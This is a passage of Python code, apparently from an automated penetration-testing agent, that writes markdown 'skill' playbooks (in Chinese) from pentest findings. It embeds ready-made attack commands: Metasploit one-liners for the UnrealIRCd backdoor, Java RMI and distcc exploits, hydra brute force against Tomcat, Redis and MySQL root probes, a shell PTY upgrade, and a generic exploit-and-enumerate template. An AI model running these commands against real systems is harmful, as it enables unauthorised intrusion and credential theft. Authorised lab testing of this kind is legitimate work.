                "irc": "msfconsole -q -x \"use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {t}; run\"",
                "rmi": "msfconsole -q -x \"use exploit/multi/misc/java_rmi_server; set RHOSTS {t}; run\"",
                "distccd": "msfconsole -q -x \"use exploit/unix/misc/distcc_exec; set RHOSTS {t}; run\"",
                "tomcat": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {t} -s {p} http-get /manager/html",
                "redis": "redis-cli -h {t} -p {p} info; redis-cli -h {t} -p {p} config get dir",
                "mysql": "mysql -h {t} -P {p} -u root -e \"select version();\"",
            }
            cmd = recommend.get(tag.lower(), f"# 针对 {service} 的标准检测命令")
            lines.append("```bash")
            lines.append(cmd.format(t=target_var, p=port))
            lines.append("```")
            lines.append("")
        if creds:
            lines.append("### Step 3: 用获得的凭据继续扩展")
            lines.append("```")
            for c in creds[:5]:
                lines.append(f"{c.get('username','?')}:{c.get('password','?')}  ({c.get('source','?')})")
            lines.append("```")
            lines.append("")

        # ──── ## Failure Modes（失败模式表） ────
        lines.append("## Failure Modes")
        lines.append("")
        lines.append("| 现象 | 可能原因 | 下一步 |")
        lines.append("|------|---------|--------|")
        if failures:
            for f in failures[:6]:
                tool = f.get("tool", "?")
                err = str(f.get("error", "") or "")[:80].replace("|", "\\|").replace("\n", " ")
                lines.append(f"| {tool} 报错: `{err}` | 工具参数/网络/版本不匹配 | 切换工具或重试时调整参数 |")
        else:
            lines.append(f"| {family} 连接被拒 | 服务未开放或防火墙 | 重新指纹扫描确认端口 |")
            lines.append(f"| 工具调用超时 | 网络抖动或服务响应慢 | 增大 timeout 或换工具 |")
        lines.append(f"| Exploit 返回 'no session created' | payload 类型不匹配目标架构 | 换 payload (reverse_tcp vs bind_tcp) |")
        lines.append("")

        # ──── ## Generalization（推广规则） ────
        lines.append("## Generalization")
        lines.append("")
        # P5 修复：用 service_family 而非全字符串做推广（vsftpd 2.3.4 → vsftpd 系列）
        lines.append(f"- **适用服务家族**：`{family}`（包含所有 {family} 同类不同版本）")
        lines.append(f"- **本次具体版本**：`{service}`")
        if cves:
            lines.append(f"- **直接覆盖 CVE**：{', '.join(cves)}")
        lines.append(f"- **同类相似 CVE 检索**：`searchsploit {family}` 或 `searchsploit {tag}`")
        lines.append("")
        lines.append(f"**通用利用模板**（适用于所有 {family} 类型服务）：")
        lines.append(f"1. nmap -sV -p <port> <target>  # 拿具体版本号")
        lines.append(f"2. searchsploit {family}  # 搜该家族所有公开 exploit")
        lines.append(f"3. msfconsole -q -x 'search {tag}; exit'  # 检查现成 metasploit 模块")
        lines.append(f"4. 把版本号填入对应 CVE PoC（如不同 minor 版本通常仍可利用）")
        lines.append(f"5. 失败回退：先看 Failure Modes 表，再考虑用 hydra/弱口令")
        lines.append("")

        # ──── ## Key Concepts ────
        lines.append("## Key Concepts")
        lines.append("")
        lines.append(f"- **端口**：{port}/{tag}")
        lines.append(f"- **服务家族**：{family}")
        lines.append(f"- **本次版本**：{service}")
        if exploit_success:
            lines.append(f"- **本次结果**：✅ 成功取得执行能力")
        if sessions:
            lines.append(f"- **会话数**：{len(sessions)}")
        if creds:
            lines.append(f"- **凭据数**：{len(creds)}")
        lines.append("")

        return "\n".join(lines)

    def _render_summary_skill(self, paths: list[dict], targets: list[str]) -> str:
        """渲染汇总 skill（v2.0 五段式合规版）

        P4-3 修复：补齐 Principle / Detection Fingerprint / Workflow /
        Failure Modes / Generalization，让 QualityGate 放行
        """
        exploit_paths = [p for p in paths if p["exploit_success"]]
        recon_paths = [p for p in paths if not p["exploit_success"]]
        target_str = ", ".join(targets[:3]) if targets else "unknown"

        # 收集所有 CVE / 服务 / 工具
        all_cves: list[str] = []
        all_services: list[str] = []
        all_tools: list[str] = []
        for p in paths:
            for v in p.get("vulnerabilities", []):
                for m in re.findall(r"CVE-\d{4}-\d+", str(v.get("cve", "") or v.get("name", "")), re.IGNORECASE):
                    if m.upper() not in all_cves:
                        all_cves.append(m.upper())
            svc = p.get("service", "")
            if svc and svc not in all_services:
                all_services.append(svc)
            for c in p.get("commands", []):
                t = c.get("tool", "")
                if t and t not in all_tools:
                    all_tools.append(t)

        lines = [
            "---",
            "name: pentest-summary",
            f"description: 渗透测试汇总({target_str}): {len(exploit_paths)} 成功 / {len(recon_paths)} 检测",
            "domain: penetration-testing",
            "subdomain: workflow-summary",
            f"tags: [summary, pentest, {'exploit' if exploit_paths else 'recon'}]",
            "severity: info",
            "version: '2.0'",
            "source: auto-generated",
            "---",
            "",
            "## Principle",
            "",
            "本 skill 记录了一次完整渗透测试的端到端发现，作为下次相似环境的参考蓝本。",
            f"涉及目标: {target_str}",
            f"涉及服务: {', '.join(all_services[:10]) if all_services else '(未识别)'}",
        ]
        if all_cves:
            lines.append(f"涉及 CVE: {', '.join(all_cves[:10])}")
        lines.append("")

        lines.append("## Detection Fingerprint")
        lines.append("")
        lines.append("**触发条件**：遇到与本次相似的服务组合时（参考下表）可重放本流程。")
        lines.append("")
        lines.append("| 端口 | 服务 | 本次结果 |")
        lines.append("|------|------|---------|")
        for p in paths[:15]:
            outcome = "✅ 利用" if p["exploit_success"] else "🔍 检测"
            lines.append(f"| {p['port']} | {p['service']} | {outcome} |")
        lines.append("")

        lines.append("## Workflow")
        lines.append("")
        lines.append(f"### 成功路径 ({len(exploit_paths)})")
        for p in exploit_paths:
            creds_note = ""
            if p["credentials"]:
                creds_note = f" (凭据: {p['credentials'][0].get('username', '?')})"
            lines.append(f"- 端口 `{p['port']}/{p['tag']}`{creds_note}: skill `{p['name']}`")
        if recon_paths:
            lines.append("")
            lines.append(f"### 已检测但未利用 ({len(recon_paths)})")
            for p in recon_paths:
                lines.append(f"- 端口 `{p['port']}/{p['tag']}`: skill `{p['name']}`")
        if all_tools:
            lines.append("")
            lines.append(f"### 涉及工具")
            lines.append(f"`{'`, `'.join(all_tools[:12])}`")
        lines.append("")

        lines.append("## Failure Modes")
        lines.append("")
        lines.append("| 现象 | 可能原因 | 下一步 |")
        lines.append("|------|---------|--------|")
        lines.append("| 大量服务发现但无成功 exploit | 服务版本已修补 | 检查目标补丁状态，换 CVE |")
        lines.append("| 拿到 session 后立即断开 | nc 无 PTY、payload 类型不对 | 升级 PTY (`python -c 'import pty;pty.spawn(\"/bin/bash\")'`) 或换 reverse_tcp |")
        lines.append("| Reflection 未沉淀新 skill | QualityGate 拒绝 frontmatter 不全 | 修复 SkillGenerator 模板（已在 P4-2 完成） |")
        lines.append("")

        lines.append("## Generalization")
        lines.append("")
        lines.append("**本流程适用于**：同时存在多种网络服务的 Linux 服务器靶机。")
        lines.append("**最有效优先级**：")
        lines.append("1. 立即识别后门服务（端口 1524、UnrealIRCd 6667、vsftpd 2.3.4）")
        lines.append("2. metasploit search 检查目标版本是否有现成 exploit 模块")
        lines.append("3. 弱口令爆破（hydra 大字典容易超时，限制 -t 4 -W 30）")
        lines.append("4. 已拿到 session 后立即枚举 /etc/passwd, 用户家目录")
        lines.append("")

        return "\n".join(lines)
